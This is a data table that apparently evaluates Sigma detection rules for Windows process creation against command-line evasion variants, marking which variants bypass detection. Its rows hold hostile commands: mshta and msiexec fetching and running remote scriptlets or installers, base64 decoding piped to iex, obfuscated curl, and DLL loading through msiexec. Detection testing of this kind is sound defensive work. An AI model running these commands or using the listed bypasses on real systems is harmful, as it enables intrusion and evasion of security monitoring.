Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1547	proc_creation_win_lolbin_susp_grpconv	Suspicious GrpConv Execution	f14e169e-9978-4c69-acb3-1cff8200bc36		grpconv.exe --option=o	TRUE	TRUE	TRUE	
t1547	proc_creation_win_lolbin_susp_grpconv	Suspicious GrpConv Execution	f14e169e-9978-4c69-acb3-1cff8200bc36	"cmd.exe /c ""grpconv.exe -o`n"""	grpconv.exe -o`n	TRUE	FALSE	FALSE	Suspicious GrpConv Execution (f14e169e-9978-4c69-acb3-1cff8200bc36)
t1547	proc_creation_win_lolbin_susp_grpconv	Suspicious GrpConv Execution	f14e169e-9978-4c69-acb3-1cff8200bc36	"cmd.exe /c ""grpconv.exe -o\"""""	"grpconv.exe -o"""	TRUE	FALSE	FALSE	Suspicious GrpConv Execution (f14e169e-9978-4c69-acb3-1cff8200bc36)
t1547	proc_creation_win_lolbin_susp_grpconv	Suspicious GrpConv Execution	f14e169e-9978-4c69-acb3-1cff8200bc36	"cmd.exe /c ""grpconv.exe -o'\''"""	grpconv.exe -o'\''	TRUE	FALSE	FALSE	Suspicious GrpConv Execution (f14e169e-9978-4c69-acb3-1cff8200bc36)
t1021.003	proc_creation_win_mmc_mmc20_lateral_movement	MMC20 Lateral Movement	f1f3bf22-deb2-418d-8cce-e1a45e46a5bd		C:\\WINDOWS\\system32\\mmc.exe -Embedding	TRUE	TRUE	TRUE	
t1021.003	proc_creation_win_mmc_mmc20_lateral_movement	MMC20 Lateral Movement	f1f3bf22-deb2-418d-8cce-e1a45e46a5bd		"""C:\\WINDOWS\\system32\\mmc.exe"" -Embedding"	FALSE	FALSE	FALSE	
t1021.003	proc_creation_win_mmc_mmc20_lateral_movement	MMC20 Lateral Movement	f1f3bf22-deb2-418d-8cce-e1a45e46a5bd		C:\\WINDOWS\\system32\\mmc.exe  -Embedding	TRUE	TRUE	TRUE	
t1021.003	proc_creation_win_mmc_mmc20_lateral_movement	MMC20 Lateral Movement	f1f3bf22-deb2-418d-8cce-e1a45e46a5bd		C:\\WINDOWS\system32\mmc.exe -Embedding	TRUE	TRUE	TRUE	
t1021.003	proc_creation_win_mmc_mmc20_lateral_movement	MMC20 Lateral Movement	f1f3bf22-deb2-418d-8cce-e1a45e46a5bd		C:\\WINNT\\system32\\mmc.exe -Embedding	FALSE	FALSE	FALSE	
t1218.005	proc_creation_win_mshta_http	Remotely Hosted HTA File Executed Via Mshta.EXE	b98d0db6-511d-45de-ad02-e82a98729620	mshta.exe  javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()	mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()	TRUE	FALSE	FALSE	Remotely Hosted HTA File Executed Via Mshta.EXE (b98d0db6-511d-45de-ad02-e82a98729620); Suspicious JavaScript Execution Via Mshta.EXE (67f113fa-e23d-4271-befa-30113b3e08b1)
t1218.005	proc_creation_win_mshta_http	Remotely Hosted HTA File Executed Via Mshta.EXE	b98d0db6-511d-45de-ad02-e82a98729620	mshta.exe  javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105.001/src/mshta.sct')).Exec();close();	mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105.001/src/mshta.sct')).Exec();close();	TRUE	FALSE	FALSE	Remotely Hosted HTA File Executed Via Mshta.EXE (b98d0db6-511d-45de-ad02-e82a98729620); Suspicious JavaScript Execution Via Mshta.EXE (67f113fa-e23d-4271-befa-30113b3e08b1)
t1218.005	proc_creation_win_mshta_http	Remotely Hosted HTA File Executed Via Mshta.EXE	b98d0db6-511d-45de-ad02-e82a98729620	"mshta.exe  \""javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close();\"""	"mshta.exe ""javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close();"""	TRUE	FALSE	FALSE	Remotely Hosted HTA File Executed Via Mshta.EXE (b98d0db6-511d-45de-ad02-e82a98729620); Suspicious JavaScript Execution Via Mshta.EXE (67f113fa-e23d-4271-befa-30113b3e08b1)
t1218.005	proc_creation_win_mshta_http	Remotely Hosted HTA File Executed Via Mshta.EXE	b98d0db6-511d-45de-ad02-e82a98729620	mshta.exe  javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close();	mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close();	TRUE	FALSE	FALSE	Remotely Hosted HTA File Executed Via Mshta.EXE (b98d0db6-511d-45de-ad02-e82a98729620); Suspicious JavaScript Execution Via Mshta.EXE (67f113fa-e23d-4271-befa-30113b3e08b1)
t1218.005	proc_creation_win_mshta_http	Remotely Hosted HTA File Executed Via Mshta.EXE	b98d0db6-511d-45de-ad02-e82a98729620		mshta.exe \\live.sysinternals.com\tools\payload.hta	TRUE	TRUE	TRUE	
t1218.005	proc_creation_win_mshta_javascript	Suspicious JavaScript Execution Via Mshta.EXE	67f113fa-e23d-4271-befa-30113b3e08b1	"mshta.exe   javascript:a=GetObject(\""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct\"").Exec();close()"	"mshta.exe  javascript:a=GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct"").Exec();close()"	TRUE	FALSE	FALSE	Remotely Hosted HTA File Executed Via Mshta.EXE (b98d0db6-511d-45de-ad02-e82a98729620); Suspicious JavaScript Execution Via Mshta.EXE (67f113fa-e23d-4271-befa-30113b3e08b1)
t1140	proc_creation_win_mshta_susp_execution	MSHTA Execution with Suspicious File Extensions	cc7abbd0-762b-41e3-8a26-57ad50d2eea3	"mshta.exe  \""C:\Users\Public\payload.png.hta\"""	"mshta.exe ""C:\Users\Public\payload.png.hta"""	TRUE	FALSE	FALSE	MSHTA Execution with Suspicious File Extensions (cc7abbd0-762b-41e3-8a26-57ad50d2eea3); Suspicious Mshta.EXE Execution Patterns (e32f92d1-523e-49c3-9374-bdb13b46a3ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba)
t1140	proc_creation_win_mshta_susp_execution	MSHTA Execution with Suspicious File Extensions	cc7abbd0-762b-41e3-8a26-57ad50d2eea3		"mshta.exe ""javascript:new%20ActiveXObject('WScript.Shell').Run('calc.exe');window.close();"""	TRUE	TRUE	FALSE	Suspicious JavaScript Execution Via Mshta.EXE (67f113fa-e23d-4271-befa-30113b3e08b1); Wscript Shell Run In CommandLine (2c28c248-7f50-417a-9186-a85b223010ee); Wscript Shell Run In CommandLine (2c28c248-7f50-417a-9186-a85b223010ee)
t1140	proc_creation_win_mshta_susp_execution	MSHTA Execution with Suspicious File Extensions	cc7abbd0-762b-41e3-8a26-57ad50d2eea3		"mshta.exe ""C:\Users\Public\script.hta"""	TRUE	TRUE	FALSE	Suspicious Mshta.EXE Execution Patterns (e32f92d1-523e-49c3-9374-bdb13b46a3ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba)
t1140	proc_creation_win_mshta_susp_execution	MSHTA Execution with Suspicious File Extensions	cc7abbd0-762b-41e3-8a26-57ad50d2eea3		"mshta.exe ""http://example.com/payload.hta"""	TRUE	TRUE	FALSE	Remotely Hosted HTA File Executed Via Mshta.EXE (b98d0db6-511d-45de-ad02-e82a98729620)
t1140	proc_creation_win_mshta_susp_execution	MSHTA Execution with Suspicious File Extensions	cc7abbd0-762b-41e3-8a26-57ad50d2eea3		"mshta.exe ""C:\Users\Public\payload.hta"""	TRUE	TRUE	FALSE	Suspicious Mshta.EXE Execution Patterns (e32f92d1-523e-49c3-9374-bdb13b46a3ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba)
t1140	proc_creation_win_powershell_base64_frombase64string	PowerShell Base64 Encoded FromBase64String Cmdlet	fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c		"powershell.exe -Command ""[Convert]::FromBase64String('d2hvYW1p')"""	TRUE	TRUE	FALSE	Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1140	proc_creation_win_powershell_base64_frombase64string	PowerShell Base64 Encoded FromBase64String Cmdlet	fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c		"powershell.exe -Command ""[System.Convert]::FromBase64String('d2hvYW1p')"""	TRUE	TRUE	FALSE	Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1140	proc_creation_win_powershell_base64_frombase64string	PowerShell Base64 Encoded FromBase64String Cmdlet	fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c		"powershell.exe -Command ""[Convert]::( 'FromBase64String' )('d2hvYW1p')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1140	proc_creation_win_powershell_base64_frombase64string	PowerShell Base64 Encoded FromBase64String Cmdlet	fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c		"powershell.exe -Command ""[Convert]::FromBase64String( 'd2hvYW1p' )"""	TRUE	TRUE	FALSE	Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1140	proc_creation_win_powershell_base64_frombase64string	PowerShell Base64 Encoded FromBase64String Cmdlet	fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c		"powershell.exe -Command ""[Convert]::FromBase64String([String]::new('d2hvYW1p'))"""	TRUE	TRUE	FALSE	Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1140	proc_creation_win_powershell_base64_frombase64string	PowerShell Base64 Encoded FromBase64String Cmdlet	fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c		"powershell.exe -Command ""[Convert]::FromBase64String( [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes('d2hvYW1p')) )"""	TRUE	TRUE	FALSE	Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1140	proc_creation_win_powershell_base64_frombase64string	PowerShell Base64 Encoded FromBase64String Cmdlet	fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c		"powershell.exe -Command ""[Convert]::FromBase64String( ( 'd2hv' + 'YW1p' ) )"""	TRUE	TRUE	FALSE	Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1140	proc_creation_win_powershell_base64_frombase64string	PowerShell Base64 Encoded FromBase64String Cmdlet	fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c		"powershell.exe -Command ""[Convert]::FromBase64String( (Get-Content 'C:\base64.txt') )"""	TRUE	TRUE	FALSE	Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1140	proc_creation_win_powershell_base64_frombase64string	PowerShell Base64 Encoded FromBase64String Cmdlet	fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c		"powershell.exe -Command ""[Convert]::FromBase64String( (Get-Content 'C:\base64.txt') ) | iex"""	TRUE	TRUE	FALSE	Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Suspicious PowerShell IEX Execution Patterns (09576804-7a05-458e-a817-eb718ca91f54); Suspicious PowerShell IEX Execution Patterns (09576804-7a05-458e-a817-eb718ca91f54); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1140	proc_creation_win_susp_cli_obfuscation_escape_char	Potential Commandline Obfuscation Using Escape Characters	f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd	"cmd.exe /c curl h""t""t""p""😕//example.com"	"cmd.exe /c curl h""t""t""p""😕//example.com"	TRUE	FALSE	FALSE	Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 1 (4a30ac0c-b9d6-4e01-b71a-5f851bbf4259); Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 1 (4a30ac0c-b9d6-4e01-b71a-5f851bbf4259); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1140	proc_creation_win_susp_cli_obfuscation_escape_char	Potential Commandline Obfuscation Using Escape Characters	f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd		cmd.exe /c curl h  t  t  p://example.com	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1140	proc_creation_win_susp_cli_obfuscation_escape_char	Potential Commandline Obfuscation Using Escape Characters	f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd	cmd.exe /c curl h^t^t^p://example.com	cmd.exe /c curl h^t^t^p://example.com	TRUE	FALSE	FALSE	Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218.007	proc_creation_win_msiexec_dll	DllUnregisterServer Function Call Via Msiexec.EXE	84f52741-8834-4a8c-a413-2eb2269aa6c8	"c:\windows\system32\msiexec.exe  /z \""C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll\"""	"c:\windows\system32\msiexec.exe /z ""C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll"""	TRUE	FALSE	FALSE	DllUnregisterServer Function Call Via Msiexec.EXE (84f52741-8834-4a8c-a413-2eb2269aa6c8)
t1218.007	proc_creation_win_msiexec_dll	DllUnregisterServer Function Call Via Msiexec.EXE	84f52741-8834-4a8c-a413-2eb2269aa6c8		copy msiexec.exe not_msiexec.exe && .\not_msiexec.exe -z payload.dll	FALSE	FALSE	FALSE	
t1218.007	proc_creation_win_msiexec_dll	DllUnregisterServer Function Call Via Msiexec.EXE	84f52741-8834-4a8c-a413-2eb2269aa6c8		msiexec.exe -zpayload.dll	TRUE	TRUE	TRUE	
t1218.007	proc_creation_win_msiexec_dll	DllUnregisterServer Function Call Via Msiexec.EXE	84f52741-8834-4a8c-a413-2eb2269aa6c8		"msiexec.exe /z ""C:\path\to\payload.tmp"""	TRUE	TRUE	TRUE	
t1218.007	proc_creation_win_msiexec_dll	DllUnregisterServer Function Call Via Msiexec.EXE	84f52741-8834-4a8c-a413-2eb2269aa6c8	msiexec.exe  /z payload.dll	msiexec.exe /z payload.dll	TRUE	FALSE	FALSE	DllUnregisterServer Function Call Via Msiexec.EXE (84f52741-8834-4a8c-a413-2eb2269aa6c8)
t1218.007	proc_creation_win_msiexec_embedding	Suspicious MsiExec Embedding Parent	4a2a2c3e-209f-4d01-b513-4155a540b469	powershell.exe  -nop -Command Write-Host 'Bypassed'	MsiExec.exe -Embedding 12345 /I fake.msi & powershell.exe -nop -Command Write-Host 'Bypassed'	TRUE	FALSE	FALSE	Suspicious MsiExec Embedding Parent (4a2a2c3e-209f-4d01-b513-4155a540b469); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1218.007	proc_creation_win_msiexec_embedding	Suspicious MsiExec Embedding Parent	4a2a2c3e-209f-4d01-b513-4155a540b469		MsiExec.exe -Embedding 12345 /I fake.msi & pwsh -nop -Command Write-Host 'Bypassed'	FALSE	FALSE	FALSE	
t1218.007	proc_creation_win_msiexec_embedding	Suspicious MsiExec Embedding Parent	4a2a2c3e-209f-4d01-b513-4155a540b469	powershell.exe  -Command Write-Host 'Bypassed'	MsiExec.exe -Embedding 12345 /I fake.msi & powershell.exe -Command Write-Host 'Bypassed'	TRUE	FALSE	FALSE	Suspicious MsiExec Embedding Parent (4a2a2c3e-209f-4d01-b513-4155a540b469); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1218.007	proc_creation_win_msiexec_execute_dll	Suspicious Msiexec Execute Arbitrary DLL	6f4191bb-912b-48a8-9ce7-682769541e6d	"c:\windows\system32\msiexec.exe  /y \""C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll\"""	"c:\windows\system32\msiexec.exe /y ""C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll"""	TRUE	FALSE	FALSE	Suspicious Msiexec Execute Arbitrary DLL (6f4191bb-912b-48a8-9ce7-682769541e6d)
t1218.007	proc_creation_win_msiexec_execute_dll	Suspicious Msiexec Execute Arbitrary DLL	6f4191bb-912b-48a8-9ce7-682769541e6d	"c:\windows\system32\msiexec.exe   /y \""C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll\"""	"c:\windows\system32\msiexec.exe  /y ""C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll"""	TRUE	FALSE	FALSE	Suspicious Msiexec Execute Arbitrary DLL (6f4191bb-912b-48a8-9ce7-682769541e6d)
t1218.007	proc_creation_win_msiexec_execute_dll	Suspicious Msiexec Execute Arbitrary DLL	6f4191bb-912b-48a8-9ce7-682769541e6d	"c:\windows\system32\msiexec.exe  -y \""C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll\"""	"c:\windows\system32\msiexec.exe -y ""C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll"""	TRUE	FALSE	FALSE	Suspicious Msiexec Execute Arbitrary DLL (6f4191bb-912b-48a8-9ce7-682769541e6d)
t1218.007	proc_creation_win_msiexec_execute_dll	Suspicious Msiexec Execute Arbitrary DLL	6f4191bb-912b-48a8-9ce7-682769541e6d		"c:\windows\system32\msiexec.exe/y ""C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll"""	FALSE	FALSE	FALSE	
t1218.007	proc_creation_win_msiexec_execute_dll	Suspicious Msiexec Execute Arbitrary DLL	6f4191bb-912b-48a8-9ce7-682769541e6d	"c:\windows\system32\msiexec.exe  /y \""C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll\"" \""\"""	"c:\windows\system32\msiexec.exe /y ""C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll"" """""	TRUE	FALSE	FALSE	Suspicious Msiexec Execute Arbitrary DLL (6f4191bb-912b-48a8-9ce7-682769541e6d)
t1218.007	proc_creation_win_msiexec_execute_dll	Suspicious Msiexec Execute Arbitrary DLL	6f4191bb-912b-48a8-9ce7-682769541e6d	c:\windows\system32\msiexec.exe  /y C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll	c:\windows\system32\msiexec.exe /y C:\AtomicRedTeam\atomics\T1218.007\bin\MSIRunner.dll	TRUE	FALSE	FALSE	Potential Renamed Rundll32 Execution (2569ed8c-1147-498a-9b8c-2ad3656b10ed); Suspicious Msiexec Execute Arbitrary DLL (6f4191bb-912b-48a8-9ce7-682769541e6d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529); Suspicious High IntegrityLevel Conhost Legacy Option (3037d961-21e9-4732-b27a-637bcc7bf539)
t1218.007	proc_creation_win_msiexec_install_quiet	Msiexec Quiet Installation	79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5	"c:\windows\system32\msiexec.exe  /q /i \""C:\AtomicRedTeam\atomics\T1218.007\bin\T1218.007_DLL.msi\"""	"c:\windows\system32\msiexec.exe /q /i ""C:\AtomicRedTeam\atomics\T1218.007\bin\T1218.007_DLL.msi"""	TRUE	FALSE	FALSE	Msiexec Quiet Installation (79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5)
t1218.007	proc_creation_win_msiexec_install_quiet	Msiexec Quiet Installation	79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5	"c:\windows\system32\msiexec.exe  /quiet /i \""C:\AtomicRedTeam\atomics\T1218.007\bin\T1218.007_DLL.msi\"""	"c:\windows\system32\msiexec.exe /quiet /i ""C:\AtomicRedTeam\atomics\T1218.007\bin\T1218.007_DLL.msi"""	TRUE	FALSE	FALSE	Msiexec Quiet Installation (79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5)
t1218.007	proc_creation_win_msiexec_install_quiet	Msiexec Quiet Installation	79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5	"c:\windows\system32\msiexec.exe  /i \""C:\AtomicRedTeam\atomics\T1218.007\bin\T1218.007_DLL.msi\"" /q"	"c:\windows\system32\msiexec.exe /i ""C:\AtomicRedTeam\atomics\T1218.007\bin\T1218.007_DLL.msi"" /q"	TRUE	FALSE	FALSE	Msiexec Quiet Installation (79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5)
t1218.007	proc_creation_win_msiexec_install_quiet	Msiexec Quiet Installation	79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5		"""c:\windows\system32\msiexec.exe"" /q /i ""C:\AtomicRedTeam\atomics\T1218.007\bin\T1218.007_DLL.msi"""	FALSE	FALSE	FALSE	
t1218.007	proc_creation_win_msiexec_install_quiet	Msiexec Quiet Installation	79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5	c:\windows\system32\msiexec.exe  /q /i C:\AtomicRedTeam\atomics\T1218.007\bin\T1218.007_DLL.msi	c:\windows\system32\msiexec.exe /q /i C:\AtomicRedTeam\atomics\T1218.007\bin\T1218.007_DLL.msi	TRUE	FALSE	FALSE	Msiexec Quiet Installation (79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5)
t1218.007	proc_creation_win_msiexec_install_remote	Suspicious Msiexec Quiet Install From Remote Location	8150732a-0c9d-4a99-82b9-9efb9b90c40c	"c:\windows\system32\msiexec.exe  /quiet /i \""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\"""	"c:\windows\system32\msiexec.exe /quiet /i ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"""	TRUE	FALSE	FALSE	Msiexec Quiet Installation (79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5); Suspicious Msiexec Quiet Install From Remote Location (8150732a-0c9d-4a99-82b9-9efb9b90c40c)
t1218.007	proc_creation_win_msiexec_install_remote	Suspicious Msiexec Quiet Install From Remote Location	8150732a-0c9d-4a99-82b9-9efb9b90c40c	"c:\windows\system32\msiexec.exe  -q -i \""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\"""	"c:\windows\system32\msiexec.exe -q -i ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"""	TRUE	FALSE	FALSE	Msiexec Quiet Installation (79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5); Suspicious Msiexec Quiet Install From Remote Location (8150732a-0c9d-4a99-82b9-9efb9b90c40c)
t1218.007	proc_creation_win_msiexec_install_remote	Suspicious Msiexec Quiet Install From Remote Location	8150732a-0c9d-4a99-82b9-9efb9b90c40c	"c:\windows\system32\msiexec.exe  /q /i\""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\"""	"c:\windows\system32\msiexec.exe /q /i""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"""	TRUE	FALSE	FALSE	Msiexec Quiet Installation (79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5); Suspicious Msiexec Quiet Install From Remote Location (8150732a-0c9d-4a99-82b9-9efb9b90c40c)
t1021.001	proc_creation_win_mstsc_remote_connection	New Remote Desktop Connection Initiated Via Mstsc.EXE	954f0af7-62dd-418f-b3df-a84bc2c7a774	C:\\WINDOWS\\system32\\mstsc.exe  /v:THAIMX	C:\\WINDOWS\\system32\\mstsc.exe /v:THAIMX	TRUE	FALSE	FALSE	New Remote Desktop Connection Initiated Via Mstsc.EXE (954f0af7-62dd-418f-b3df-a84bc2c7a774)
t1021.001	proc_creation_win_mstsc_remote_connection	New Remote Desktop Connection Initiated Via Mstsc.EXE	954f0af7-62dd-418f-b3df-a84bc2c7a774		"""C:\\WINDOWS\\system32\\mstsc.exe"" /v:THAIMX"	FALSE	FALSE	FALSE	
t1021.001	proc_creation_win_mstsc_remote_connection	New Remote Desktop Connection Initiated Via Mstsc.EXE	954f0af7-62dd-418f-b3df-a84bc2c7a774	C:\\WINDOWS\\system32\\mstsc.exe  -v:THAIMX	C:\\WINDOWS\\system32\\mstsc.exe -v:THAIMX	TRUE	FALSE	FALSE	New Remote Desktop Connection Initiated Via Mstsc.EXE (954f0af7-62dd-418f-b3df-a84bc2c7a774)
t1021.001	proc_creation_win_mstsc_remote_connection	New Remote Desktop Connection Initiated Via Mstsc.EXE	954f0af7-62dd-418f-b3df-a84bc2c7a774	C:\\WINDOWS\\system32\\mstsc.exe  /v:THAIMX /f	C:\\WINDOWS\\system32\\mstsc.exe /v:THAIMX /f	TRUE	FALSE	FALSE	New Remote Desktop Connection Initiated Via Mstsc.EXE (954f0af7-62dd-418f-b3df-a84bc2c7a774)
t1021.001	proc_creation_win_mstsc_remote_connection	New Remote Desktop Connection Initiated Via Mstsc.EXE	954f0af7-62dd-418f-b3df-a84bc2c7a774	C:\\WINDOWS\\system32\\mstsc.exe  /v:THAIMX /f /span	C:\\WINDOWS\\system32\\mstsc.exe /v:THAIMX /f /span	TRUE	FALSE	FALSE	New Remote Desktop Connection Initiated Via Mstsc.EXE (954f0af7-62dd-418f-b3df-a84bc2c7a774)
